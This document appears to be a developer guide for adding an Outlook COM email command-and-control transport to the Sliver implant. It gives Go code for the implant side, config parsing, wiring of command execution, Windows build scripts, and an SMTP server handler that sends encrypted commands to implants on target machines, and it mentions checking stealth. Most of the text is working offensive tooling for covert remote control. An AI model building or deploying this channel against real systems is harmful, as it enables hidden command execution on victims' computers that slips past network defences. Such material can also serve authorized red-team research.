# Integration Guide: Outlook COM Transport

This guide shows how to integrate the Outlook COM transport into the main Sliver implant.

## Step 1: Add Dependency

First, ensure `go-ole` is added to your project:

```bash
go get github.com/go-ole/go-ole
```

## Step 2: Modify Transport Initialization

### Option A: Modify `implant/sliver/transports/transports.go`

Add the Outlook transport to the main transport initialization:

```go
package transports

import (
    // ... existing imports
    "github.com/bishopfox/sliver/implant/sliver/transports/outlook"
)

// StartOutlookTransport initializes and starts the Outlook COM transport
func StartOutlookTransport(config *outlook.OutlookConfig) error {
    if !config.Enabled {
        return nil
    }

    transport, err := outlook.NewOutlookTransport(config)
    if err != nil {
        return fmt.Errorf("failed to create outlook transport: %w", err)
    }

    // Start transport in background
    go func() {
        ctx := context.Background()
        if err := transport.Start(ctx); err != nil {
            // Log error (use Sliver's logging system)
            log.Printf("[!] Outlook transport error: %v", err)
        }
    }()

    return nil
}
```

### Option B: Create Windows-Specific File

Create `implant/sliver/transports/transports_outlook.go`:

```go
//go:build windows
// +build windows

package transports

import (
    "context"
    "fmt"
    "log"

    "github.com/bishopfox/sliver/implant/sliver/transports/outlook"
)

// InitializeOutlookTransport sets up the Outlook COM transport
func InitializeOutlookTransport(config *outlook.OutlookConfig) (*outlook.OutlookTransport, error) {
    if !config.Enabled {
        return nil, nil
    }

    transport, err := outlook.NewOutlookTransport(config)
    if err != nil {
        return nil, fmt.Errorf("outlook transport init failed: %w", err)
    }

    return transport, nil
}

// StartOutlookTransport starts the transport
func StartOutlookTransport(transport *outlook.OutlookTransport) error {
    if transport == nil {
        return nil
    }

    go func() {
        ctx := context.Background()
        if err := transport.Start(ctx); err != nil {
            log.Printf("[!] Outlook transport stopped: %v", err)
        }
    }()

    return nil
}
```

Create stub for non-Windows: `implant/sliver/transports/transports_outlook_generic.go`:

```go
//go:build !windows
// +build !windows

package transports

import (
    "errors"
    "github.com/bishopfox/sliver/implant/sliver/transports/outlook"
)

func InitializeOutlookTransport(config *outlook.OutlookConfig) (*outlook.OutlookTransport, error) {
    return nil, errors.New("outlook transport only available on Windows")
}

func StartOutlookTransport(transport *outlook.OutlookTransport) error {
    return errors.New("outlook transport only available on Windows")
}
```

## Step 3: Configuration Loading

### Create Config Parser

Add to your config loading logic (e.g., in `implant/sliver/config.go`):

```go
import (
    "encoding/json"
    "time"
    "github.com/bishopfox/sliver/implant/sliver/transports/outlook"
)

// Config structure (add to existing config)
type ImplantConfig struct {
    // ... existing fields
    OutlookTransport *OutlookTransportConfig `json:"outlook_transport,omitempty"`
}

// OutlookTransportConfig JSON representation
type OutlookTransportConfig struct {
    Enabled       bool   `json:"enabled"`
    C2Email       string `json:"c2_email"`
    PollInterval  string `json:"poll_interval"`
    FolderType    int    `json:"folder_type"`
    EncryptionKey string `json:"encryption_key"` // Hex-encoded
    DeleteAfter   bool   `json:"delete_after"`
    Jitter        int    `json:"jitter"`
    SessionID     string `json:"session_id"`
    MaxRetries    int    `json:"max_retries"`
    Debug         bool   `json:"debug"`
}

// ParseOutlookConfig converts JSON config to OutlookConfig
func ParseOutlookConfig(jsonConfig *OutlookTransportConfig) (*outlook.OutlookConfig, error) {
    if jsonConfig == nil {
        return outlook.DefaultConfig(), nil
    }

    // Parse poll interval
    pollInterval, err := time.ParseDuration(jsonConfig.PollInterval)
    if err != nil {
        pollInterval = 60 * time.Second
    }

    // Decode hex key
    encKey, err := outlook.HexToKey(jsonConfig.EncryptionKey)
    if err != nil {
        return nil, fmt.Errorf("invalid encryption key: %w", err)
    }

    return &outlook.OutlookConfig{
        Enabled:       jsonConfig.Enabled,
        C2Email:       jsonConfig.C2Email,
        PollInterval:  pollInterval,
        FolderType:    jsonConfig.FolderType,
        EncryptionKey: encKey,
        DeleteAfter:   jsonConfig.DeleteAfter,
        Jitter:        jsonConfig.Jitter,
        SessionID:     jsonConfig.SessionID,
        MaxRetries:    jsonConfig.MaxRetries,
        Debug:         jsonConfig.Debug,
    }, nil
}
```

## Step 4: Main Implant Integration

In your main implant initialization (e.g., `implant/main.go` or similar):

```go
package main

import (
    "log"
    "github.com/bishopfox/sliver/implant/sliver/transports"
    "github.com/bishopfox/sliver/implant/sliver/transports/outlook"
)

func main() {
    // Load configuration (from embedded config, command line, etc.)
    config := loadConfig()

    // Parse Outlook config
    outlookConfig, err := ParseOutlookConfig(config.OutlookTransport)
    if err != nil {
        log.Printf("[!] Failed to parse Outlook config: %v", err)
    } else if outlookConfig.Enabled {
        // Initialize Outlook transport
        if err := transports.StartOutlookTransport(outlookConfig); err != nil {
            log.Printf("[!] Failed to start Outlook transport: %v", err)
        } else {
            log.Printf("[+] Outlook transport started")
        }
    }

    // ... rest of implant initialization
}
```

## Step 5: Command Execution Integration

To integrate with Sliver's task system, modify the `executeCommand` function in `outlook.go`:

```go
// Replace the placeholder executeCommand in outlook.go with:

import (
    "github.com/bishopfox/sliver/implant/sliver/taskrunner"
)

func (t *OutlookTransport) executeCommand(command string) (string, error) {
    // Parse command and execute using Sliver's task runner
    task, err := taskrunner.ParseCommand(command)
    if err != nil {
        return "", fmt.Errorf("invalid command: %w", err)
    }

    result, err := taskrunner.Execute(task)
    if err != nil {
        return "", fmt.Errorf("execution failed: %w", err)
    }

    return result, nil
}
```

**Note**: Adjust the import paths based on your actual Sliver task execution system.

## Step 6: Build Configuration

### Makefile Addition

Add build target for Outlook transport in your `Makefile`:

```makefile
# Outlook transport build
.PHONY: build-outlook
build-outlook:
	GOOS=windows GOARCH=amd64 go build \
		-ldflags "-s -w" \
		-o dist/sliver-outlook.exe \
		./implant

# Build with tags
.PHONY: build-outlook-debug
build-outlook-debug:
	GOOS=windows GOARCH=amd64 go build \
		-tags outlook,debug \
		-o dist/sliver-outlook-debug.exe \
		./implant
```

### Build Script

Or create a build script `scripts/build-outlook.sh`:

```bash
#!/bin/bash
set -e

echo "[*] Building Sliver with Outlook COM transport..."

# Generate encryption key
echo "[*] Generating encryption key..."
cd implant/sliver/transports/outlook
KEY=$(go run keygen.go)
echo "[+] Encryption Key: $KEY"

# Build for Windows
echo "[*] Building Windows implant..."
cd ../../../../
GOOS=windows GOARCH=amd64 go build \
    -ldflags "-s -w -X main.encryptionKey=$KEY" \
    -o dist/sliver-outlook.exe \
    ./implant

echo "[+] Build complete: dist/sliver-outlook.exe"
echo "[+] Encryption Key: $KEY"
echo "[!] Save this key for C2 configuration!"
```

## Step 7: Testing Integration

### Create Test Configuration

`test-outlook-config.json`:

```json
{
  "outlook_transport": {
    "enabled": true,
    "c2_email": "test-c2@example.com",
    "poll_interval": "30s",
    "folder_type": 16,
    "encryption_key": "your-hex-encoded-32-byte-key",
    "delete_after": false,
    "jitter": 50,
    "session_id": "test-session-001",
    "max_retries": 5,
    "debug": true
  }
}
```

### Test on Windows VM

1. Set up Windows VM with Outlook
2. Configure test email account
3. Build implant with test config
4. Run implant and monitor debug output
5. Send test commands via email
6. Verify results are received

## Step 8: C2 Server Integration

### Server-Side Handler Example

Create `server/c2/outlook/handler.go`:

```go
package outlook

import (
    "encoding/base64"
    "fmt"
    "net/smtp"
    "time"

    "github.com/bishopfox/sliver/implant/sliver/transports/outlook"
)

type OutlookC2Handler struct {
    SMTPServer string
    SMTPPort   int
    Email      string
    Password   string
    EncKey     []byte
}

func (h *OutlookC2Handler) SendCommand(implantEmail, sessionID, command string) error {
    taskID := fmt.Sprintf("task-%d", time.Now().Unix())

    msg := &outlook.C2Message{
        Type:      "cmd",
        TaskID:    taskID,
        SessionID: sessionID,
        Payload:   base64.StdEncoding.EncodeToString([]byte(command)),
    }

    subject, body, err := outlook.EncodeMessage(msg, h.EncKey)
    if err != nil {
        return err
    }

    return h.sendEmail(implantEmail, subject, body)
}

func (h *OutlookC2Handler) sendEmail(to, subject, body string) error {
    auth := smtp.PlainAuth("", h.Email, h.Password, h.SMTPServer)

    message := fmt.Sprintf("From: %s\r\n", h.Email)
    message += fmt.Sprintf("To: %s\r\n", to)
    message += fmt.Sprintf("Subject: %s\r\n\r\n", subject)
    message += body

    addr := fmt.Sprintf("%s:%d", h.SMTPServer, h.SMTPPort)
    return smtp.SendMail(addr, auth, h.Email, []string{to}, []byte(message))
}
```

## Troubleshooting Integration

### Common Issues

1. **Import Errors**: Ensure all imports use correct module paths
2. **Build Errors on Linux**: Use build tags to exclude Windows-only code
3. **COM Initialization**: Ensure COM is initialized before use
4. **Config Loading**: Verify encryption key is properly decoded from hex
5. **Task Execution**: Check that command execution integrates with Sliver's task system

### Debug Checklist

- [ ] go-ole dependency installed
- [ ] Build tags properly set (windows/!windows)
- [ ] Configuration properly loaded
- [ ] Encryption keys match (implant & C2)
- [ ] Outlook installed and configured on target
- [ ] Email account working
- [ ] Transport initialized before use
- [ ] Proper error handling and logging

## Next Steps

After integration:

1. Test on isolated Windows VM
2. Verify command execution
3. Test result transmission
4. Check stealth characteristics
5. Monitor for errors/crashes
6. Document any issues
7. Create deployment guide

## Support

For integration issues:
- Review logs with `debug: true`
- Check Outlook COM accessibility
- Verify network connectivity
- Test email send/receive manually
- Consult the main README.md for transport details
